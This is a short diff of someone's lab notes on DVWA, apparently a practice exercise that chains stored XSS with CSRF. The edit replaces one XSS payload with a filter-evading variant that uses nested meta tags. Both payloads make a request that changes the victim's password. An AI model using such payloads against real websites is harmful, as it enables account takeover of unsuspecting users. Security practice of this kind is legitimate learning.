@@ -46,4 +46,4 @@
   #
   * This will require me to add the user token to my XSS that appears in the requests for the password change from the DVWA page.
   * I've attempted to go back to the XSS (Stored) page on the same security level and enter this into the name field with no alerts popping up:
-    <img onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">
+   <img<meta>><<meta>img onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">
